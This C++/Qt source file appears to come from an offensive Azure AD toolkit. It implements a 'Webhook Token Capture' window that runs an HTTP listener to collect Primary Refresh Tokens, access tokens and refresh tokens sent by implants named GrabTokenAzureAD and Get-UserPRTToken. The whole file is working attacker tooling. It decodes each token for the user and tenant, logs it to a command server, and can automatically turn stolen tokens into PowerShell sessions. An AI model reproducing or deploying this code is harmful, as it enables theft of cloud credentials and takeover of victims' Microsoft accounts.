#include "WebhookCaptureWindow.h"
#include "DashboardWindow.h"
#include "network/ClientTransport.h"
#include "TokenStore.h"
#include "../shared/Protocol.h"
#include <QApplication>
#include <QHeaderView>
#include <QMessageBox>
#include <QClipboard>
#include <QUuid>
#include <QTimer>
#include <QRegularExpression>
#include <QDebug>

WebhookCaptureWindow::WebhookCaptureWindow(DashboardWindow *dashboard, QWidget *parent)
    : QWidget(parent),
      parentDashboard(dashboard),
      tcpServer(nullptr)
{
    setAttribute(Qt::WA_DeleteOnClose);
    setWindowTitle("Webhook Token Capture");
    resize(750, 550);

    QVBoxLayout *mainLayout = new QVBoxLayout(this);

    // Instructions
    QLabel *instructions = new QLabel(
        "Captures tokens from PRT scripts (Get-UserPRTToken) and OAuth implants (GrabTokenAzureAD).\n"
        "Supports PRT tokens, Access tokens, and Refresh tokens.");
    instructions->setWordWrap(true);
    mainLayout->addWidget(instructions);

    // Controls row 1: Port and Capture Mode
    QHBoxLayout *controlsLayout = new QHBoxLayout();

    controlsLayout->addWidget(new QLabel("Port:"));
    portSpinBox = new QSpinBox();
    portSpinBox->setRange(1024, 65535);
    portSpinBox->setValue(8000);
    controlsLayout->addWidget(portSpinBox);

    controlsLayout->addSpacing(15);

    controlsLayout->addWidget(new QLabel("Capture:"));
    captureModeCombo = new QComboBox();
    captureModeCombo->addItem("All Tokens", CaptureAll);
    captureModeCombo->addItem("PRT Only", CapturePRTOnly);
    captureModeCombo->addItem("Access & Refresh Only", CaptureAccessRefreshOnly);
    captureModeCombo->setToolTip("Filter which token types to capture and log");
    controlsLayout->addWidget(captureModeCombo);

    controlsLayout->addSpacing(15);

    toggleBtn = new QPushButton("Start Listener");
    toggleBtn->setMinimumWidth(120);
    connect(toggleBtn, &QPushButton::clicked, this, &WebhookCaptureWindow::toggleListener);
    controlsLayout->addWidget(toggleBtn);

    controlsLayout->addStretch();

    clearBtn = new QPushButton("Clear");
    connect(clearBtn, &QPushButton::clicked, this, &WebhookCaptureWindow::clearCapturedTokens);
    controlsLayout->addWidget(clearBtn);

    mainLayout->addLayout(controlsLayout);

    // Controls row 2: Session creation
    QHBoxLayout *optionsLayout = new QHBoxLayout();
    createSessionCheckbox = new QCheckBox("Create session from captured token");
    createSessionCheckbox->setToolTip("Automatically create a PowerShell session when a token is captured");
    optionsLayout->addWidget(createSessionCheckbox);
    optionsLayout->addStretch();
    mainLayout->addLayout(optionsLayout);

    // Status label
    statusLabel = new QLabel("Listener stopped");
    statusLabel->setStyleSheet("color: gray;");
    mainLayout->addWidget(statusLabel);

    // Captured tokens table
    mainLayout->addWidget(new QLabel("Captured Tokens:"));
    tokenTable = new QTableWidget(0, 6);
    tokenTable->setHorizontalHeaderLabels({"Time", "Type", "User", "Tenant ID", "Expires", "Audience"});
    tokenTable->horizontalHeader()->setStretchLastSection(true);
    tokenTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
    tokenTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    tokenTable->setEditTriggers(QAbstractItemView::NoEditTriggers);
    tokenTable->setAlternatingRowColors(true);
    mainLayout->addWidget(tokenTable);

    // Log output
    mainLayout->addWidget(new QLabel("Activity Log:"));
    logOutput = new QTextEdit();
    logOutput->setReadOnly(true);
    logOutput->setMaximumHeight(150);
    mainLayout->addWidget(logOutput);

    setLayout(mainLayout);

    wireTransport();
}

WebhookCaptureWindow::~WebhookCaptureWindow()
{
    stopListener();
}

void WebhookCaptureWindow::toggleListener()
{
    if (tcpServer && tcpServer->isListening()) {
        stopListener();
    } else {
        startListener();
    }
}

void WebhookCaptureWindow::startListener()
{
    if (tcpServer) {
        stopListener();
    }

    tcpServer = new QTcpServer(this);
    connect(tcpServer, &QTcpServer::newConnection, this, &WebhookCaptureWindow::handleNewConnection);

    quint16 port = static_cast<quint16>(portSpinBox->value());
    if (!tcpServer->listen(QHostAddress::Any, port)) {
        logOutput->append(QString("<span style='color:red;'>[!] Failed to bind port %1: %2</span>")
            .arg(port).arg(tcpServer->errorString()));
        statusLabel->setText("Listener error");
        statusLabel->setStyleSheet("color: red;");
        delete tcpServer;
        tcpServer = nullptr;
        return;
    }

    portSpinBox->setEnabled(false);
    toggleBtn->setText("Stop Listener");
    statusLabel->setText(QString("Listening on 0.0.0.0:%1").arg(port));
    statusLabel->setStyleSheet("color: green; font-weight: bold;");
    logOutput->append(QString("<span style='color:green;'>[+] Listener started on port %1</span>").arg(port));

    if (parentDashboard) {
        parentDashboard->logEvent(QString("[Webhook] Listener started on port %1").arg(port));
    }
}

void WebhookCaptureWindow::stopListener()
{
    if (!tcpServer) return;

    tcpServer->close();
    const auto sockets = tcpServer->findChildren<QTcpSocket*>();
    for (QTcpSocket *socket : sockets) {
        socket->disconnect();
        socket->abort();
    }
    delete tcpServer;
    tcpServer = nullptr;

    portSpinBox->setEnabled(true);
    toggleBtn->setText("Start Listener");
    statusLabel->setText("Listener stopped");
    statusLabel->setStyleSheet("color: gray;");
    logOutput->append("<span style='color:gray;'>[*] Listener stopped</span>");
}

void WebhookCaptureWindow::handleNewConnection()
{
    while (tcpServer->hasPendingConnections()) {
        QTcpSocket *socket = tcpServer->nextPendingConnection();
        if (!socket) continue;

        QString clientAddr = socket->peerAddress().toString();
        logOutput->append(QString("<span style='color:gray;'>[*] Connection from %1</span>").arg(clientAddr));

        // Buffer to accumulate data
        QByteArray *buffer = new QByteArray();

        connect(socket, &QTcpSocket::readyRead, this, [this, socket, buffer]() {
            QByteArray newData = socket->readAll();
            buffer->append(newData);

            logOutput->append(QString("<span style='color:gray;'>[*] Received %1 bytes (total: %2)</span>")
                .arg(newData.size()).arg(buffer->size()));

            // Check if we have complete HTTP headers
            int headerEnd = buffer->indexOf("\r\n\r\n");
            if (headerEnd == -1) {
                headerEnd = buffer->indexOf("\n\n");
                if (headerEnd == -1) {
                    logOutput->append("<span style='color:gray;'>[*] Waiting for headers...</span>");
                    return; // Wait for more data
                }
                headerEnd += 2;
            } else {
                headerEnd += 4;
            }

            // Parse Content-Length if present
            QString headers = QString::fromUtf8(buffer->left(headerEnd));
            int contentLength = 0;
            QRegularExpression clRegex("Content-Length:\\s*(\\d+)", QRegularExpression::CaseInsensitiveOption);
            QRegularExpressionMatch match = clRegex.match(headers);
            if (match.hasMatch()) {
                contentLength = match.captured(1).toInt();
            }

            // Check if we have the complete body
            int expectedTotal = headerEnd + contentLength;
            if (buffer->size() < expectedTotal) {
                logOutput->append(QString("<span style='color:gray;'>[*] Waiting for body... (have %1, need %2)</span>")
                    .arg(buffer->size()).arg(expectedTotal));
                return; // Wait for more data
            }

            // We have complete request, process it
            logOutput->append(QString("<span style='color:gray;'>[*] Complete request: %1 bytes</span>").arg(buffer->size()));
            processRequest(socket, *buffer);
        });

        connect(socket, &QTcpSocket::disconnected, this, [socket, buffer]() {
            delete buffer;
            socket->deleteLater();
        });

        // Timeout for incomplete requests
        QTimer::singleShot(30000, socket, [socket, buffer]() {
            if (socket->state() == QAbstractSocket::ConnectedState) {
                delete buffer;
                socket->disconnectFromHost();
            }
        });
    }
}

void WebhookCaptureWindow::sendHttpResponse(QTcpSocket *socket, const QByteArray &response)
{
    socket->write(response);
    socket->flush();
    socket->waitForBytesWritten(3000);

    // Give client time to read before closing
    connect(socket, &QTcpSocket::bytesWritten, socket, [socket]() {
        if (socket->bytesToWrite() == 0) {
            socket->disconnectFromHost();
        }
    });

    // Fallback disconnect after short delay
    QTimer::singleShot(100, socket, [socket]() {
        if (socket->state() == QAbstractSocket::ConnectedState) {
            socket->disconnectFromHost();
        }
    });
}

void WebhookCaptureWindow::processRequest(QTcpSocket *socket, const QByteArray &data)
{
    QString request = QString::fromUtf8(data);
    QString clientAddr = socket->peerAddress().toString();

    // Handle GET requests (status page)
    if (request.startsWith("GET")) {
        QByteArray response =
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: 108\r\n"
            "Connection: close\r\n\r\n"
            "<html><body><h1>ANIMO Webhook Capture</h1>"
            "<p>Server is running. Send POST requests with token data.</p>"
            "</body></html>";
        sendHttpResponse(socket, response);
        return;
    }

    // Handle POST requests
    if (request.startsWith("POST")) {
        logOutput->append(QString("<span style='color:cyan;'>[*] POST received from %1</span>").arg(clientAddr));

        // Extract body (after double CRLF)
        int bodyStart = request.indexOf("\r\n\r\n");
        if (bodyStart == -1) {
            bodyStart = request.indexOf("\n\n");
        }

        QString body;
        if (bodyStart != -1) {
            body = request.mid(bodyStart).trimmed();
        }

        if (!body.isEmpty()) {
            processToken(body);
        } else {
            logOutput->append("<span style='color:orange;'>[!] Empty POST body</span>");
        }

        // Send success response
        QByteArray responseBody = "OK - Token captured\n";
        QByteArray response =
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/plain\r\n"
            "Content-Length: " + QByteArray::number(responseBody.size()) + "\r\n"
            "Connection: close\r\n\r\n" + responseBody;
        sendHttpResponse(socket, response);
        return;
    }

    // Unknown request
    QByteArray responseBody = "Only GET and POST supported\n";
    QByteArray response =
        "HTTP/1.1 405 Method Not Allowed\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: " + QByteArray::number(responseBody.size()) + "\r\n"
        "Connection: close\r\n\r\n" + responseBody;
    sendHttpResponse(socket, response);
}

void WebhookCaptureWindow::processToken(const QString &tokenData)
{
    QString data = tokenData.trimmed();

    // Handle JSON payloads (from GrabTokenAzureAD or wrapped tokens)
    if (data.startsWith("{")) {
        QJsonDocument doc = QJsonDocument::fromJson(data.toUtf8());
        if (doc.isObject()) {
            processJsonPayload(doc.object());
            return;
        }
    }

    // Plain JWT token (from PRT scripts)
    if (data.startsWith("eyJ")) {
        processSingleToken(data);
        return;
    }

    // Check for error messages
    if (data.startsWith("[ERROR]")) {
        logOutput->append(QString("<span style='color:red;'>[!] Implant error: %1</span>").arg(data));
        return;
    }

    logOutput->append(QString("<span style='color:orange;'>[!] Received unknown data format: %1...</span>")
        .arg(data.left(50)));
}

void WebhookCaptureWindow::processJsonPayload(const QJsonObject &obj)
{
    // Format from GrabTokenAzureAD: {"label":"graph","token":{access_token, refresh_token, ...}}
    if (obj.contains("label") && obj.contains("token")) {
        QString label = obj["label"].toString();
        QJsonObject tokenObj = obj["token"].toObject();

        QString accessToken = tokenObj["access_token"].toString();
        QString refreshToken = tokenObj["refresh_token"].toString();
        QString resource = tokenObj.contains("resource")
            ? tokenObj["resource"].toString()
            : (label == "management" ? "https://management.azure.com" : "https://graph.microsoft.com");

        if (!accessToken.isEmpty()) {
            processAccessRefreshTokens(accessToken, refreshToken, resource, label);
        }
        return;
    }

    // Format: {"token": "eyJ..."} or {"access_token": "eyJ...", "refresh_token": "..."}
    if (obj.contains("access_token")) {
        QString accessToken = obj["access_token"].toString();
        QString refreshToken = obj["refresh_token"].toString();
        QString resource = obj["resource"].toString();
        if (resource.isEmpty()) {
            resource = decodeJwtClaim(accessToken, "aud");
        }
        processAccessRefreshTokens(accessToken, refreshToken, resource, "oauth");
        return;
    }

    // Simple wrapped token
    QString token;
    if (obj.contains("token")) {
        token = obj["token"].toString();
    } else if (obj.contains("data")) {
        token = obj["data"].toString();
    }

    if (!token.isEmpty() && token.startsWith("eyJ")) {
        processSingleToken(token);
        return;
    }

    // Check for error
    if (obj.contains("error")) {
        logOutput->append(QString("<span style='color:red;'>[!] Error from implant: %1</span>")
            .arg(obj["error"].toString()));
        return;
    }

    logOutput->append("<span style='color:orange;'>[!] Unrecognized JSON format</span>");
}

void WebhookCaptureWindow::processAccessRefreshTokens(const QString &accessToken,
                                                       const QString &refreshToken,
                                                       const QString &resource,
                                                       const QString &label)
{
    // Check capture mode filter - Access & Refresh tokens are NOT PRT
    if (!shouldCapture(false)) {
        logOutput->append(QString("<span style='color:gray;'>[*] Skipped %1 token (filter: PRT only)</span>").arg(label));
        return;
    }

    captureCount++;

    // Decode claims from access token
    QString upn = decodeJwtClaim(accessToken, "upn");
    if (upn.isEmpty()) upn = decodeJwtClaim(accessToken, "preferred_username");
    if (upn.isEmpty()) upn = decodeJwtClaim(accessToken, "unique_name");
    if (upn.isEmpty()) upn = "Unknown";

    QString tenantId = decodeJwtClaim(accessToken, "tid");
    if (tenantId.isEmpty()) tenantId = "N/A";

    QString aud = decodeJwtClaim(accessToken, "aud");
    if (aud.isEmpty()) aud = resource;

    // Parse expiry
    QDateTime expiry;
    QString expStr = decodeJwtClaim(accessToken, "exp");
    if (!expStr.isEmpty()) {
        expiry = QDateTime::fromSecsSinceEpoch(expStr.toLongLong());
    }

    // Log message with refresh token indicator
    QString tokenType = refreshToken.isEmpty() ? "Access" : "Access+Refresh";
    QString color = refreshToken.isEmpty() ? "green" : "cyan";
    logOutput->append(QString("<span style='color:%1;'>[+] %2 Token #%3 captured (%4: %5)</span>")
        .arg(color, tokenType).arg(captureCount).arg(label, aud));

    // Add to table
    addTokenToTable(accessToken, tokenType, upn, tenantId, expiry, aud);

    // Log to server with refresh token
    QString source = QString("webhook_%1").arg(label);
    logTokenToServer(accessToken, refreshToken, source, resource);

    // Dashboard event
    if (parentDashboard) {
        parentDashboard->logEvent(QString("[Webhook] %1 token captured for %2 (%3)")
            .arg(label, upn, aud));
    }

    // Create session if enabled
    if (createSessionCheckbox->isChecked()) {
        createSessionFromToken(accessToken, refreshToken, resource);
    }
}

void WebhookCaptureWindow::processSingleToken(const QString &token)
{
    bool isPRT = isPRTToken(token);

    // Check capture mode filter
    if (!shouldCapture(isPRT)) {
        QString typeStr = isPRT ? "PRT" : "Access";
        logOutput->append(QString("<span style='color:gray;'>[*] Skipped %1 token (filter active)</span>").arg(typeStr));
        return;
    }

    captureCount++;

    // Decode JWT claims
    QString upn = decodeJwtClaim(token, "upn");
    if (upn.isEmpty()) upn = decodeJwtClaim(token, "preferred_username");
    if (upn.isEmpty()) upn = decodeJwtClaim(token, "unique_name");
    if (upn.isEmpty()) upn = "Unknown";

    QString tenantId = decodeJwtClaim(token, "tid");
    if (tenantId.isEmpty()) tenantId = "N/A";

    QString aud = decodeJwtClaim(token, "aud");
    if (aud.isEmpty()) aud = "N/A";

    QString tokenType = isPRT ? "PRT" : "Access";
    QString source = isPRT ? "webhook_prt" : "webhook_access";

    // Log with appropriate styling
    if (isPRT) {
        logOutput->append(QString("<span style='color:magenta; font-weight:bold;'>[+] PRT Token #%1 captured! (Primary Refresh Token)</span>").arg(captureCount));
    } else {
        logOutput->append(QString("<span style='color:green;'>[+] Access Token #%1 captured</span>").arg(captureCount));
    }

    // Parse expiry
    QDateTime expiry;
    QString expStr = decodeJwtClaim(token, "exp");
    if (!expStr.isEmpty()) {
        expiry = QDateTime::fromSecsSinceEpoch(expStr.toLongLong());
    }

    // Add to table
    addTokenToTable(token, tokenType, upn, tenantId, expiry, aud);

    // Log to server
    logTokenToServer(token, QString(), source, aud);

    // Dashboard event
    if (parentDashboard) {
        QString msg = isPRT
            ? QString("[Webhook] PRT captured for %1 (tenant: %2)").arg(upn, tenantId)
            : QString("[Webhook] Token captured for %1 (tenant: %2)").arg(upn, tenantId);
        parentDashboard->logEvent(msg);
    }

    // Create session if enabled
    if (createSessionCheckbox->isChecked()) {
        createSessionFromToken(token, QString(), aud);
    }
}

bool WebhookCaptureWindow::isPRTToken(const QString &jwt)
{
    // Check is_primary claim
    QString isPrimaryStr = decodeJwtClaim(jwt, "is_primary");
    if (isPrimaryStr.toLower() == "true" || isPrimaryStr == "1") {
        return true;
    }

    // Check for PRT-specific claims
    QString sessionKey = decodeJwtClaim(jwt, "session_key");
    if (!sessionKey.isEmpty()) {
        return true;
    }

    // Check request_nonce (PRT-derived tokens often have this)
    QString requestNonce = decodeJwtClaim(jwt, "request_nonce");
    if (!requestNonce.isEmpty()) {
        return true;
    }

    return false;
}

bool WebhookCaptureWindow::shouldCapture(bool isPRT)
{
    CaptureMode mode = static_cast<CaptureMode>(captureModeCombo->currentData().toInt());

    switch (mode) {
        case CaptureAll:
            return true;
        case CapturePRTOnly:
            return isPRT;
        case CaptureAccessRefreshOnly:
            return !isPRT;
    }
    return true;
}

QString WebhookCaptureWindow::decodeJwtClaim(const QString &jwt, const char *field)
{
    const QStringList parts = jwt.split('.');
    if (parts.size() < 2) return QString();

    QByteArray payload = parts.at(1).toUtf8();
    int pad = (4 - (payload.size() % 4)) % 4;
    payload.append(QByteArray(pad, '='));
    payload = QByteArray::fromBase64(payload, QByteArray::Base64UrlEncoding);

    QJsonObject obj = QJsonDocument::fromJson(payload).object();
    QJsonValue val = obj.value(field);

    if (val.isString()) {
        return val.toString();
    } else if (val.isDouble()) {
        return QString::number(static_cast<qint64>(val.toDouble()));
    } else if (val.isBool()) {
        return val.toBool() ? "true" : "false";
    }
    return QString();
}

void WebhookCaptureWindow::addTokenToTable(const QString &token, const QString &tokenType,
                                            const QString &user, const QString &tenant,
                                            const QDateTime &expiry, const QString &audience)
{
    int row = tokenTable->rowCount();
    tokenTable->insertRow(row);

    // Time
    QTableWidgetItem *timeItem = new QTableWidgetItem(QDateTime::currentDateTime().toString("hh:mm:ss"));
    tokenTable->setItem(row, 0, timeItem);

    // Token Type (PRT or Access)
    QTableWidgetItem *typeItem = new QTableWidgetItem(tokenType);
    if (tokenType == "PRT") {
        typeItem->setForeground(QColor("#FF00FF")); // Magenta for PRT
        typeItem->setFont(QFont(typeItem->font().family(), -1, QFont::Bold));
    }
    tokenTable->setItem(row, 1, typeItem);

    // User
    QTableWidgetItem *userItem = new QTableWidgetItem(user);
    tokenTable->setItem(row, 2, userItem);

    // Tenant
    QTableWidgetItem *tenantItem = new QTableWidgetItem(tenant);
    tokenTable->setItem(row, 3, tenantItem);

    // Expiry
    QString expiryStr = expiry.isValid() ? expiry.toString("yyyy-MM-dd hh:mm") : "N/A";
    QTableWidgetItem *expiryItem = new QTableWidgetItem(expiryStr);
    if (expiry.isValid() && expiry < QDateTime::currentDateTime()) {
        expiryItem->setForeground(Qt::red);
    }
    tokenTable->setItem(row, 4, expiryItem);

    // Audience
    QTableWidgetItem *audItem = new QTableWidgetItem(audience);
    tokenTable->setItem(row, 5, audItem);

    // Store full token in first column's data
    timeItem->setData(Qt::UserRole, token);

    tokenTable->scrollToBottom();
}

QObject* WebhookCaptureWindow::locateTransport() const
{
    if (auto *t = qApp->findChild<ClientTransport*>()) return t;
    if (auto *o = qApp->findChild<QObject*>("ClientTransport")) return o;
    return nullptr;
}

void WebhookCaptureWindow::logTokenToServer(const QString &accessToken,
                                             const QString &refreshToken,
                                             const QString &source,
                                             const QString &resource)
{
    if (accessToken.isEmpty()) return;

    QObject *transportObj = locateTransport();
    if (!transportObj) {
        qWarning() << "[WebhookCapture] Cannot log token: no transport found";
        return;
    }

    QString sessionId = QString("webhook_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));

    QString upn = decodeJwtClaim(accessToken, "upn");
    if (upn.isEmpty()) upn = decodeJwtClaim(accessToken, "preferred_username");
    if (upn.isEmpty()) upn = decodeJwtClaim(accessToken, "unique_name");

    QString tenantId = decodeJwtClaim(accessToken, "tid");
    QString aud = decodeJwtClaim(accessToken, "aud");
    QString finalResource = resource.isEmpty()
        ? (aud.isEmpty() ? QStringLiteral("https://graph.microsoft.com") : aud)
        : resource;

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
    req.insert("sessionId", sessionId);
    req.insert("source", source);
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty()) req.insert("refreshToken", refreshToken);
    if (!upn.isEmpty()) req.insert("user", upn);
    if (!tenantId.isEmpty()) req.insert("tenantId", tenantId);
    if (!finalResource.isEmpty()) req.insert("resource", finalResource);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

    // Also store in TokenStore for plugin windows
    TokenInfo tokenInfo;
    tokenInfo.accessToken = accessToken;
    tokenInfo.refreshToken = refreshToken;
    tokenInfo.resource = finalResource;
    TokenStore::instance()->storeToken(sessionId, tokenInfo);

    QString logMsg = refreshToken.isEmpty()
        ? QString("<span style='color:blue;'>[+] Access token logged (session: %1)</span>")
        : QString("<span style='color:blue;'>[+] Access + Refresh tokens logged (session: %1)</span>");
    logOutput->append(logMsg.arg(sessionId.left(16) + "..."));
}

void WebhookCaptureWindow::createSessionFromToken(const QString &accessToken,
                                                   const QString &refreshToken,
                                                   const QString &resource)
{
    QObject *transportObj = locateTransport();
    if (!transportObj) {
        logOutput->append("<span style='color:orange;'>[!] Cannot create session - not connected to server</span>");
        return;
    }

    QString aud = decodeJwtClaim(accessToken, "aud");
    QString upn = decodeJwtClaim(accessToken, "upn");
    if (upn.isEmpty()) upn = decodeJwtClaim(accessToken, "preferred_username");
    QString tid = decodeJwtClaim(accessToken, "tid");
    QString domain = upn.contains('@') ? upn.section('@', 1, 1) : QStringLiteral("UnknownDomain");

    QString finalResource = resource.isEmpty()
        ? (aud.isEmpty() ? QStringLiteral("https://graph.microsoft.com") : aud)
        : resource;

    sessionHandled = false;
    pendingRid = QUuid::createUuid().toString(QUuid::WithoutBraces);
    pendingAccessToken = accessToken;
    pendingRefreshToken = refreshToken;
    pendingResource = finalResource;

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_NEW_SESSION);
    req.insert("mode", QStringLiteral("tokens"));
    req.insert("resource", finalResource);
    req.insert("rid", pendingRid);
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty()) req.insert("refreshToken", refreshToken);
    if (!upn.isEmpty()) req.insert("user", upn);
    if (!tid.isEmpty()) req.insert("tenantId", tid);
    if (!domain.isEmpty()) req.insert("domain", domain);

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        typed->sendJson(req);
    } else {
        QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));
    }

    logOutput->append(QString("<span style='color:cyan;'>[*] Creating session for %1...</span>")
        .arg(upn.isEmpty() ? "user" : upn));
}

void WebhookCaptureWindow::wireTransport()
{
    QObject *transportObj = locateTransport();
    if (!transportObj || hookConnected) return;

    if (auto *typed = qobject_cast<ClientTransport*>(transportObj)) {
        connect(typed, &ClientTransport::messageReceived, this,
            [this](const QJsonObject &obj) {
                const QString act = obj.value(Protocol::F_ACTION).toString();
                const QString status = obj.value(Protocol::F_STATUS).toString();
                const QString respRid = obj.value("rid").toString();
                const QString sid = obj.value("sessionId").toString();

                if (!pendingRid.isEmpty() && !respRid.isEmpty() && respRid != pendingRid)
                    return;

                if (act == QStringLiteral("session_created")) {
                    if (sessionHandled) return;
                    sessionHandled = true;
                    pendingRid.clear();

                    const QString user = obj.value("user").toString("Unknown");
                    const QString tenantId = obj.value("tenantId").toString("N/A");
                    const QString domain = obj.value("domain").toString("N/A");
                    const QString res = obj.value("resource").toString("N/A");

                    TokenInfo tokenInfo;
                    tokenInfo.accessToken = pendingAccessToken;
                    tokenInfo.refreshToken = pendingRefreshToken;
                    tokenInfo.resource = pendingResource;
                    TokenStore::instance()->storeToken(sid, tokenInfo);

                    if (parentDashboard) {
                        parentDashboard->addSessionRow(sid, user, tenantId, domain, res);
                        parentDashboard->logEvent(
                            QString("[+] Session created from webhook token for %1 (ID: %2)").arg(user, sid));
                        if (!pendingRefreshToken.isEmpty()) {
                            parentDashboard->setSessionTokenExpiry(sid, pendingAccessToken,
                                pendingRefreshToken, pendingResource, tenantId);
                        }
                    }

                    pendingAccessToken.clear();
                    pendingRefreshToken.clear();
                    pendingResource.clear();

                    logOutput->append(QString("<span style='color:green;'>[+] Session created: %1 (ID: %2)</span>")
                        .arg(user, sid.left(8) + "..."));
                    return;
                }

                const bool isError = (act == QStringLiteral("error")) || (status == Protocol::STATUS_ERR);
                if (isError && !pendingRid.isEmpty()) {
                    if (sessionHandled) return;
                    sessionHandled = true;
                    pendingRid.clear();
                    const QString msg = obj.value("message").toString("Unknown error");
                    logOutput->append(QString("<span style='color:red;'>[!] Session creation failed: %1</span>").arg(msg));
                }
            });
        hookConnected = true;
    }
}

void WebhookCaptureWindow::clearCapturedTokens()
{
    tokenTable->setRowCount(0);
    logOutput->clear();
    captureCount = 0;
    logOutput->append("<span style='color:gray;'>[*] Cleared captured tokens</span>");
}
